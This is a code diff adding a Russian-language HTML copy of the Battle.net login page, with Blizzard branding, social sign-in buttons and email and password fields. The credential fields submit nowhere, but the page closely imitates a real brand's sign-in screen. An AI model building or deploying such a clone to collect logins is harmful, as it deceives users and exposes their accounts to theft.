@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <link rel="icon" href="images/favicon.ico" type="image/x-icon">
+        <title>Авторизация в Battle.net</title>
+        <style>
+            .body{
+                background-attachment: scroll;
+                background-clip: border-box;
+                background-color: #15171E;
+                background-image: none;
+                background-origin: padding-box;
+                background-position-x: 50%;
+                background-position-y: 0;
+                background-size: auto;
+                color: #ffffff;
+                font-family: "Object Sans", "Arial", "Helvetica", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                font-feature-settings: "kern" "liga";
+                font-size: 16px;
+                height: 965px;
+                line-height: 24px;
+                margin-top: 0;
+                margin-bottom: 0;
+                margin-left: 0;
+                margin-right: 0;
+                min-width: 275px;
+                text-size-adjust: 100%;
+                display: flex;
+                justify-content: center; 
+                align-items: center; 
+                min-height: 100vh;
+            }
+            .main{
+                max-width: 416px;
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                position: static;
+                max-height: 735px;
+                height: 100%;
+                padding-bottom: 40px;
+                transform: none;
+            }
+            .main-logo{
+                margin: 0 auto 38px auto;
+                background-size: contain;
+                background-position: center;
+                background-repeat: no-repeat;
+                width: 240px;
+                height: 72px;
+                display: flex;
+            }
+            .text{
+                font-size: 32px;
+                color: #ffffff;
+                text-align: center;
+                display: block;
+                font-weight: 800;
+                font-size: 33px;
+                line-height: 36px;
+                margin: 40px 0px;
+            }
+            .auth-button{
+                margin: 0 auto 11px;
+                text-align: center;
+                margin-top: 35px;
+            }
+            .auth{
+                padding: 24px 0;
+                box-sizing: border-box;
+                border: none;
+                position: relative;
+                width: 100%;
+                display: block;
+            }
+            .main-div{
+                display: flex; 
+                flex-direction: column; 
+                margin: 0 auto 25px; 
+                max-width: 416px; 
+                min-height: 100%; 
+                position: static; 
+                transform: none;
+            }
+            .main-div::before{
+                content: "";
+                display: block;
+                flex-grow: 1;
+                min-height: 24px;
+                height: 70px;
+            }
+            .login{
+                display: flex;
+                flex-flow: row wrap;
+                justify-content: center;
+                align-items: center;
+                margin: 0 40px;
+            }
+            .container{
+                display: flex; 
+                flex-direction: column; 
+                width: 100%; 
+                max-width: 1200px; 
+                min-height: 100%; 
+                padding-bottom: 40px; 
+                padding-left: 0; 
+                padding-right: 0; 
+                padding-top: 0; 
+                position: relative; 
+                box-sizing: content-box;
+            }
+            .buttons{
+                display: flex;
+                flex-flow: row;
+                justify-content: center;
+                align-items: center;
+                margin: 0 40px;
+            }
+            .link{
+                margin-bottom: 24px;
+                display: list-item;
+                padding-left: 0;
+            }
+            .link-a{
+                color: #148eff;
+                text-decoration: none;
+                text-underline-position: under;
+                font-weight: 700;
+                background: transparent;
+            }
+            .link-a:hover{
+                text-decoration: underline;
+                filter: brightness(1.2);
+            }
+            .button{
+                position: relative;
+                width: 48px;
+                height: 48px;
+                padding: 0; 
+                margin: 12px;
+                border-radius: 4px;
+                display: flex; 
+                justify-content: center; 
+                align-items: center; 
+            }
+            .button:hover{
+                filter: brightness(0.8);
+            }
+            .main-span{
+                position: relative;
+                display: inline-block;   
+            }
+            .main-span:before{
+                background-color: rgba(255, 255, 255, 0.18);
+                right: 100%;
+                margin-right: 20px;
+                width: 500px;
+                content: "";
+                height: 1px;
+                position: absolute;
+                top: 50%;
+            }
+            .main-span:after{
+                background-color: rgba(255, 255, 255, 0.18);
+                left: 100%;
+                width: 500px;
+                margin-left: 20px;
+                content: "";
+                height: 1px;
+                position: absolute;
+                top: 50%;
+            }
+            .third-party{
+                color: rgba(255, 255, 255, 0.6);
+                margin: 40px 0 24px 0;
+                font-style: normal;
+                font-weight: 700;
+                width: 100%;
+                overflow: hidden;
+                white-space: nowrap;
+                font-size: 14px;
+                font-family: "Noto Sans", "Object Sans", sans-serif;
+                line-height: 21px;
+                text-transform: none;
+                padding: 0;
+                display: block;
+                text-align: center;
+            }
+            .submit-button{
+                margin-top: 5px;
+                margin-bottom: 6px;
+                display: block;
+                width: 100%;
+                padding-left: 0;
+                padding-right: 0;
+                background-color: #0074e0;
+                color: #ffffff;
+                border: 2px solid transparent;
+                font-weight: 500;
+                border-radius: 4px;
+                transition: background-color 0.2s, border-color 0.2s, color 0.2s;
+                white-space: normal;
+                margin: 3px 0;
+                padding: 0 20px;
+                font-size: 16px;
+                line-height: 20px;
+                min-height: 40px;
+                text-align: center;
+                cursor: pointer;
+                box-sizing: border-box;
+            }
+            .main-input{
+                max-width: 416px;
+                width: 100%;
+                display: inline-block;
+                vertical-align: middle;
+                height: 40px;
+                padding: 0 12px;
+                margin-top: 3px;
+                margin-bottom: 3px;
+                font-size: 16px;
+                line-height: 24px;
+                border: 1px solid rgba(255, 255, 255, 0.36);
+                background-color: #171920;
+                color: #ffffff;
+                box-sizing: border-box;
+                border-radius: 4px;
+            }
+            .main-input::placeholder{
+                font-family: "Object Sans", "Arial", "Helvetica", "Segoe UI Symbol", "Segoe MDL2 Assets", sans-serif;
+                font-weight: 300;
+                filter: brightness(1.2);
+            }
+            .main-input:focus{
+                box-shadow: 0 0 5px rgba(0, 112, 204, 0.5);
+                color: #ffffff;
+                border: 1px solid #0070CC;
+                outline: none;
+            }
+            .main-input:focus:hover{
+                border: 1px solid #ffffff;
+            }
+            .main-input:hover{
+                border: 1px solid #ffffff;
+            }
+            .links{
+                list-style: none;
+                display: block;
+                margin-block-start: 1em;
+                margin-block-end: 1em;
+                margin-inline-start: 0px;
+                margin-inline-end: 0px;
+                padding-inline-start: 40px;
+                padding: 0;
+                margin: 0 0 39.6px 30px;
+                line-height: 30px;
+                list-style-type: none;
+                text-align: center;
+                margin: 10px 0;
+                margin: 48px 0 0 0;
+                font-size: 16px;
+                line-height: 24px;
+            }
+            .footer{
+                position: absolute;
+                bottom: 0;
+                width: 100%;
+                padding-bottom: 24px;
+                align-items: center;
+                display: block;
+                bottom: 20px;
+            }
+            .footer-div{
+                display: block;
+                color: rgb(123, 123, 123);
+                font-family: "Blizzard", "Arial", "Helvetica", sans-serif;
+                font-size: 14px;
+                margin: 0;
+                padding: 0;
+                text-align: center;
+            }
+            .copyright{
+                padding: 0;
+                text-align: center;
+                font-size: 11px;
+                color: rgba(255, 255, 255, 0.3);
+                line-height: 24px;
+                text-transform: uppercase;
+            }
+            .footer-link{
+                font-size: 12px;
+                color: rgba(255, 255, 255, 0.7);
+                text-transform: uppercase;
+                font-weight: 400;
+                text-decoration: none;
+                text-underline-position: under;
+                font-weight: 700;
+                background: transparent;
+            }
+            .footer-link:hover{
+                color: #ffffff;
+            }
+        </style>
+    </head>
+    <body class="body">
+        <div class="container">
+            <div class="main-div">
+                <main class="main">
+                    <div class="auth">
+                         <div>
+                             <img class="main-logo" src="images/logo_1.svg" width="240px" height="72px">
+                         </div>
+                         <h3 class="text">Авторизоваться</h3>
+                         <div class="login">
+                             <div class="buttons">
+                                <form style="display: block; margin: 0">
+                                    <a class="button" style="background-color: #ffffff;" href="https://accounts.google.com/v3/signin/identifier?opparams=%253Fscheme%2526deviceProof%253Ddf73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee%2526isMASDK%253Dfalse&dsh=S1913322998%3A1694364030527792&client_id=196154489538-9rpkrg8u9qimu15c2p1gcas16qnocqrj.apps.googleusercontent.com&o2v=1&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Fgoogle&response_type=code&scope=openid+profile+email&service=lso&state=AVn3fAsfkI-IbA4ut33RXFY9P3xx5HY_9pbKCsJV7yDpAxrKCdtzwVcouB648SM5R6fDO0IQDsrT3xmn6JtoDhl73I1enk0CkYoOFojByi57JucD3DvV8wDDRxeMoBaysULWYhk1XVtsHUw1qgMMggLel04XbDY5BQ4V4BwMmfu-adVpAoJtjbYJpBCFley-P-9Jz2a_JJCQGN8AWVf87rV8V2WCGbcKmYT2zGlgOoxqUgaDds31w9gu78CDbh46JTJZncDEPnftCrbq31DyXQw%3D&flowName=GeneralOAuthFlow&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAN1S6zYCGs7iXjjAtMJcsDFJf2IWHNmRMZDjQVyjlldWXiq7i0-5bsEnKvqYXMXVkEkCORuN7b9_Re8FS7yaUnFj-V79NEJNdFg8zzz9XDiFIktfAXdiZRjzEYKTHzLnfjC2Q_4_3Vvr2hzrcOVBqZ4sBLaplLHQ2n4APU_UZH2444DRqOyjxGn5rjdEnBZd-6pz2oTHJ3TFn9AGTH-LfTFE1aKzro1ejJu_-mxEyuUCgAd429ucwYWl2qvxQMpV7vrfChX1WPf5uwAU4BTUsFKGWZSggY36V-9LowNML0TOMoqCuTUtk-cHQ5RlxWJwlFSUjIzl9dgdJe9TPuLocNBue4ZnkZHE65sNivgUQ5dnZiRBjR3Tyf2mZD5ngIrhgY1pexEoiA-85gQ8l1MPiWvV3zSntyvk4InZxMbsL3yKWiGfNPyYw02MIMwkG9asuOTJmkdnzhrgAD7t5dN4lhMbCo-BEvvVwWiYB5CLgAjaVqlmRE%26as%3DS1913322998%253A1694364030527792%26client_id%3D196154489538-9rpkrg8u9qimu15c2p1gcas16qnocqrj.apps.googleusercontent.com%23&app_domain=https%3A%2F%2Feu.account.battle.net&rart=ANgoxcefZJyJWJDIjGcw_C_J1lHv8rd4igOoZVACqQLBgEHYe_jzeaVWEPK0vynWUKWa03eg8gRkudsN5LgjjpceaIt_7ghn5Q">
+                                        <img style="width: 17px; height: 18px;" src="images/google.svg">
+                                    </a>
+                                </form>
+                                <form style="display: block; margin: 0;">
+                                    <a class="button" style="background-color: #1877F2;" href="https://www.facebook.com/login.php?skip_api_login=1&api_key=1173546789331741&kid_directed_site=0&app_id=1173546789331741&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fv2.12%2Fdialog%2Foauth%3Fclient_id%3D1173546789331741%26response_type%3Dcode%26state%3DARzUfx6Fb--hIlBUqZ3p-ExPcN9J4mXv8Q1lTiApVfbNjBkM1K4D4S992kFYjiqjcXegzXqzT6n44k7iFopLWlXXpQT8A_TWVKoocUPNlAUJQTI434vrOJ92OAT1t5JNomu5oNBZdL0QXKq2jD_el0CBcMJPEMAD3bl3eXDXRLz6yvEAs_DMUELEKGCXkLoyA2SpJSImFk0m8Cfo1uM0X35TXGpGt4D9AmU62mWxs3kea_GbJHcEe80RPwX5kueSFH5CdFzmuH_kdR0QpDvi_UA%253D%26scheme%26deviceProof%3Ddf73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee%26redirect_uri%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Ffacebook%26scope%3Dpublic_profile%2Bemail%2Buser_friends%26isMASDK%3Dfalse%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd9295daf-01a6-4d44-95d6-17349e7c07bb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DARzUfx6Fb--hIlBUqZ3p-ExPcN9J4mXv8Q1lTiApVfbNjBkM1K4D4S992kFYjiqjcXegzXqzT6n44k7iFopLWlXXpQT8A_TWVKoocUPNlAUJQTI434vrOJ92OAT1t5JNomu5oNBZdL0QXKq2jD_el0CBcMJPEMAD3bl3eXDXRLz6yvEAs_DMUELEKGCXkLoyA2SpJSImFk0m8Cfo1uM0X35TXGpGt4D9AmU62mWxs3kea_GbJHcEe80RPwX5kueSFH5CdFzmuH_kdR0QpDvi_UA%253D%23_%3D_&display=page&locale=en_GB&pl_dbl=0">
+                                        <img style="width: 17px; height: 18px;" src="images/facebook.svg">
+                                    </a>
+                                </form>
+                                <form style="display: block; margin: 0;">
+                                    <a class="button" style="background-color: #ffffff;" href="https://appleid.apple.com/auth/authorize?client_id=com.blizzard.login&response_type=code&state=ARuhgNBMJ07EOQmEUcx_f5V_VpeXG8KYll0mSp2syJfVQuOM1Vkkj8dKUyg7blUFhIjHD2jQJggPDsZykhTcOA1Rw5oOnxAUOxgsQ7VkTGzdRPQqK9nZ6EqZon-0g2iOwr7tLElOYR5BfKdZoSOMTEloVNgiNZpfQ8xwgnqVrPjyi6kKTVDm7gz_fsUhcY-SwXAgnyUsJu8O3jx0-F8xcMNnCF17s0tNP-P6jSDcBY0Ls_JwrAf6Z7lEOuHXvZHNlrntuPTI303bA36Ijjvngiw%3D&response_mode=form_post&scheme&deviceProof=df73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Fapple&scope=email+name&isMASDK=false">
+                                        <img style="width: 17px; height: 18px;" src="images/apple.svg">
+                                    </a>
+                                </form>
+                             </div>
+                             <div class="buttons">
+                                <form style="display: block; margin: 0">
+                                    <a class="button" style="background-color: #107c10;" href="https://login.live.com/oauth20_authorize.srf?client_id=000000004417E628&response_type=code&state=AZnaceHwavL8-6U4lFW7z2KV8uOGzzQ17P-vpVXE_gf3iMcgeNny1nRxyPBZ35BlR_By0mdezySL4U1uxKuxq3w6Ti-fBTsA7nyucFUQvIYotpUVOLbnjFzBqrNsCzKzDwvvqEyeP0lF4zTdj1ZFGSzWjmnCeJ8U7bzT4STLl7b9gVPk_SdbopuWkTea0Zouj8ExYbqR8-jcq9LACE2wCta8eoChyIfgYlZi19yXu2Z2F2w-kWF_o_iV25Idt_6tprh_LR7-1gnHSEZmCgQykk4%3D&scheme&deviceProof=df73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Flive&scope=Xboxlive.signin&isMASDK=false">
+                                        <img style="width: 17px; height: 18px;" src="images/xbox.svg">
+                                    </a>
+                                </form>
+                                <form style="display: block; margin: 0">
+                                    <a class="button" style="background-color: #0070CC;" href="https://my.account.sony.com/central/signin/?client_id=b5b165c3-4146-4a8e-822b-1116fd3b96d0&response_type=code&state=ASiCDMctts-uC-eHtNFc1UWhS_Nyx4lL7N40ihbe5_x1UWmombDv8XBPk7QZk7Rf2YtJIVi4yVoM26DCagTcIGBrrrWi8VFqHR3XrH0AuAw5Vn6ekskLyM9EKJpcUu8-XoaP7xSYXp_xd4NO3ud7dCjS0xOgXsbmmr0S3K7dLGYeZxJqp1kDqXPO5iYa6s8tcGEnZcFSkJxn33NkT5wts7O0u-9S7sjQKs0DizW9sNBSE7ruJawTp1IVBgD2x3yuK18zHuDMSTdA3k_Ye2VFuQ4%3D&scheme&deviceProof=df73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee&redirect_uri=https%3A%2F%2Feu.account.battle.net%2Flogin%2Fsignin%2Fpsn&scope=psn%3As2s&isMASDK=false&cid=047e4d22-a782-4ebc-9407-7e0b7d4e05ff&error=login_required&error_code=4165&no_captcha=false#/signin/ca?entry=ca">
+                                        <img style="width: 17px; height: 18px;" src="images/playstation.svg">
+                                    </a>
+                                </form>
+                                <form style="display: block; margin: 0">
+                                    <a class="button" style="background-color: #e60012;" href="https://accounts.nintendo.com/authorize_guide?type=mixed&redirect_uri=https%3A%2F%2Faccounts.nintendo.com%2Fconnect%2F1.0.0%2Fauthorize%3Fclient_id%3D2b8f48e61685a62a%26deviceProof%3Ddf73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee%26interacted%3D1%26isMASDK%3Dfalse%26redirect_uri%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fnintendo%26response_type%3Dcode%26scheme%3D%26scope%3Dopenid%2Boffline%2Buser.basic%2Buser.email%26state%3DAfihb7wPrkurzfv1j-hb1_tbvjM_i2mfgxeexeFgM-F0JUEfJcFOtdHm5ZdLM2Fwm7ooYnKZnThhEI1a5nddoWK2RWJmpbC6vZ0biSlOW-PiTE3ypJqg5ivTcP2mNhSFBFm6to3VxAGaMVNsHajDhdvXlrBtrYACeKO9UYY7Tu7oDXao2gcT5elNvM3cz43lOSfo7P3yGDjmm-3rHk_2X2UK3SQ8FsTQicMeSsY7S7bj2CIkpVJScjPCr_yazDy39R1MGFO4V9TR9gdam9SsmpY%253D">
+                                        <img style="width: 17px; height: 18px;" src="images/nintendo.svg">
+                                    </a>
+                                </form>
+                                <form style="display: block; margin: 0">
+                                    <a class="button" style="background-color: #ffffff;" href="https://steamcommunity.com/openid/loginform/?goto=%2Fopenid%2Flogin%3Fopenid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAcOvZqLvPpH1xTnoRimMppDUPVu3NpVT1GK9Rmet2UeOhlq7bYT87PrW5EeTOcWlbzkvLd_iMlekQSRNPdag-x-z2ctygq4aoDssmR46-LqgdO59JuZaOg8hFcdglG7L4C5gU6DQzmZxXKWsvsX8-mv4vzMIHrTSBvYUr8xrRyKh3lRTC9hx5WwV4DYPQe4oKVtzfgb4qIPHJ-qVcfLZ7o8YSxy4wQbH2Dg4cuydSjYkES3qZ0hG4XE1gvo7CpUnDoo98q8wk7NU3_DuDTEMNAA%253D%26openid.realm%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAcOvZqLvPpH1xTnoRimMppDUPVu3NpVT1GK9Rmet2UeOhlq7bYT87PrW5EeTOcWlbzkvLd_iMlekQSRNPdag-x-z2ctygq4aoDssmR46-LqgdO59JuZaOg8hFcdglG7L4C5gU6DQzmZxXKWsvsX8-mv4vzMIHrTSBvYUr8xrRyKh3lRTC9hx5WwV4DYPQe4oKVtzfgb4qIPHJ-qVcfLZ7o8YSxy4wQbH2Dg4cuydSjYkES3qZ0hG4XE1gvo7CpUnDoo98q8wk7NU3_DuDTEMNAA%253D%26openid.mode%3Dcheckid_setup%26isMASDK%3Dfalse%3Fopenid.ns%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%26openid.claimed_id%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.identity%3Dhttp%253A%252F%252Fspecs.openid.net%252Fauth%252F2.0%252Fidentifier_select%26openid.return_to%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAcOvZqLvPpH1xTnoRimMppDUPVu3NpVT1GK9Rmet2UeOhlq7bYT87PrW5EeTOcWlbzkvLd_iMlekQSRNPdag-x-z2ctygq4aoDssmR46-LqgdO59JuZaOg8hFcdglG7L4C5gU6DQzmZxXKWsvsX8-mv4vzMIHrTSBvYUr8xrRyKh3lRTC9hx5WwV4DYPQe4oKVtzfgb4qIPHJ-qVcfLZ7o8YSxy4wQbH2Dg4cuydSjYkES3qZ0hG4XE1gvo7CpUnDoo98q8wk7NU3_DuDTEMNAA%253D%26openid.realm%3Dhttps%253A%252F%252Feu.account.battle.net%252Flogin%252Fsignin%252Fsteam%253Fstate%253DAcOvZqLvPpH1xTnoRimMppDUPVu3NpVT1GK9Rmet2UeOhlq7bYT87PrW5EeTOcWlbzkvLd_iMlekQSRNPdag-x-z2ctygq4aoDssmR46-LqgdO59JuZaOg8hFcdglG7L4C5gU6DQzmZxXKWsvsX8-mv4vzMIHrTSBvYUr8xrRyKh3lRTC9hx5WwV4DYPQe4oKVtzfgb4qIPHJ-qVcfLZ7o8YSxy4wQbH2Dg4cuydSjYkES3qZ0hG4XE1gvo7CpUnDoo98q8wk7NU3_DuDTEMNAA%253D%26openid.mode%3Dcheckid_setup">
+                                        <img style="width: 17px; height: 18px;" src="images/steam.svg">
+                                    </a>
+                                </form>
+                             </div>
+                         </div>
+                         <div class="third-party">
+                            <span class="main-span">или войти через</span>
+                         </div>
+                         <div style="display: block; width: 100%; padding: 0; max-width: 416px; align-items: center;">
+                            <div style="margin: 0 auto 11px;">
+                                <input class="main-input" type="text" placeholder="Электронная почта или телефон" spellcheck="false" autocorrect="off">
+                            </div>
+                            <div style="margin: 0 auto 11px;">
+                                <input class="main-input" type="password" placeholder="Пароль" spellcheck="false" autocorrect="off">
+                            </div>
+                        </div>
+                        <div class="auth-button">
+                            <button class="submit-button" type="submit" aria-label="Авторизоваться">Авторизоваться</button>
+                        </div>
+                        <ul class="links">
+                            <li class="link">
+                                <b><a class="link-a" rel="internal" href="https://account.battle.net/creation/?theme=bnet-next&amp;flowTrackingId=68d91ff6-8262-4f01-8a6f-15e60c69f3f6&amp;bdp=df73b57692dfd98aca7fb487741e7cfa1f591f63ff167ed312b3a47437c764ee" tabindex="0" id="signup" role="button">
+                                    Зарегистрируйте учетную запись Battle.net бесплатно
+                                    </a></b>
+                            </li>
+                            <li role="link">
+                                <a class="link-a" rel="internal" target="_blank" href="https://account.battle.net/recovery/?theme=bnet-next&amp;flowTrackingId=68d91ff6-8262-4f01-8a6f-15e60c69f3f6" tabindex="0" id="loginSupport" role="button">
+                                    Вы не можете войти?
+                                    <svg style="display: inline-block; width: 0.75em; height: 0.75em; margin-left: 1px; margin-bottom: 3px; line-height: inherit; vertical-align: middle;" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 512 512"><style>svg{fill:#158eff};</style><path d="M320 0c-17.7 0-32 14.3-32 32s14.3 32 32 32h82.7L201.4 265.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L448 109.3V192c0 17.7 14.3 32 32 32s32-14.3 32-32V32c0-17.7-14.3-32-32-32H320zM80 32C35.8 32 0 67.8 0 112V432c0 44.2 35.8 80 80 80H400c44.2 0 80-35.8 80-80V320c0-17.7-14.3-32-32-32s-32 14.3-32 32V432c0 8.8-7.2 16-16 16H80c-8.8 0-16-7.2-16-16V112c0-8.8 7.2-16 16-16H192c17.7 0 32-14.3 32-32s-14.3-32-32-32H80z"/></svg>
+                                </a>
+                            </li>
+                        </ul>
+                 </main>
+            </div>
+            <footer class="footer">
+                <div class="footer-div">
+                    <a class="footer-link" href="https://www.blizzard.com/company/legal/eula" data-analytics="global-nav" data-analytics-placement="Footer - eula">Пользовательское соглашение Blizzard</a>
+                    <span>|</span>
+                    <a class="footer-link" href="https://www.blizzard.com/company/about/privacy.html" data-analytics="global-nav" data-analytics-placement="Footer - Privacy">Политика конфиденциальности</a>
+                    <span>|</span>
+                    <a class="footer-link" href="https://www.blizzard.com/company/legal/" data-analytics="global-nav" data-analytics-placement="Footer - Terms">Условия</a>
+                    <span>|</span>
+                </div>
+                <div class="footer-div">
+                    <a class="footer-link" href="https://eu.blizzard.com/company/about/infringementnotice.html" data-analytics="global-nav" data-analytics-placement="Footer - copyright">Авторское право</a>
+                    <span>|</span>
+                    <a class="footer-link" href="/login/cookies" data-analytics="global-nav" data-analytics-placement="Footer - Cookies">Файлы cookie</a>
+                    <span>|</span>
+                    <a class="footer-link" href="/login/cookies#settings" data-analytics="global-nav" data-analytics-placement="Footer - Cookie Settings">Параметры cookie</a>
+                    </div>
+                    <div class="copyright">© Blizzard Entertainment, Inc., 2023</div>
+                </div>
+            </footer>
+        </div>
+    </body>
+</html>
